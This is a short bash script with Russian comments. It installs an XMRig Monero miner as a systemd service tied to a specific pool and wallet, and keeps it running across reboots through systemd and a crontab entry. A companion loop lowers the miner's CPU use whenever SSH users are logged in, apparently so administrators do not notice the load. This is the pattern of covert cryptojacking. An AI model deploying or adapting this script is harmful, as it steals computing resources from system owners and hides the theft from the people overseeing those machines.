#!/bin/bash

# Путь к исполняемому файлу XMRig и параметры запуска
XMRIG_PATH="/usr/local/bin/xmrig"
POOL="xmr-eu1.nanopool.org:14444"
WALLET="4A9SeKhwWx8DtAboVp1e1LdbgrRJxvjEFNh4VNw1NDng6ELLeKJPVrPQ9n9eNc4iLVC4BKeR4egnUL68D1qUmdJ7N3TaB5w"

# Создание системного сервиса для XMRig
echo "[Unit]
Description=XMRig Miner
After=network.target

[Service]
ExecStart=$XMRIG_PATH -o $POOL -u $WALLET --cpu-priority=5
Nice=10
CPUQuota=90%

[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/xmrig.service

# Перезагрузка системного менеджера для распознавания нового сервиса
sudo systemctl daemon-reload

# Включение и запуск XMRig
sudo systemctl enable xmrig
sudo systemctl start xmrig

# Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
CONTROL_SCRIPT="/usr/local/bin/xmrig_control.sh"
echo "#!/bin/bash

# Функция для обновления CPUQuota в зависимости от количества SSH-подключений
update_cpu_quota() {
    ssh_connections=\$(who | grep -c \"ssh\")
    if [ \$ssh_connections -gt 0 ]; then
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=30%
    else
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=90%
    fi
}

# Бесконечный цикл для проверки каждые 60 секунд
while true; do
    update_cpu_quota
    sleep 60
done" | sudo tee $CONTROL_SCRIPT

# Делаем скрипт исполняемым
sudo chmod +x $CONTROL_SCRIPT

# Добавление скрипта в автозагрузку через crontab
(crontab -l ; echo "@reboot $CONTROL_SCRIPT") | crontab -

# Запуск скрипта управления XMRig
$CONTROL_SCRIPT &
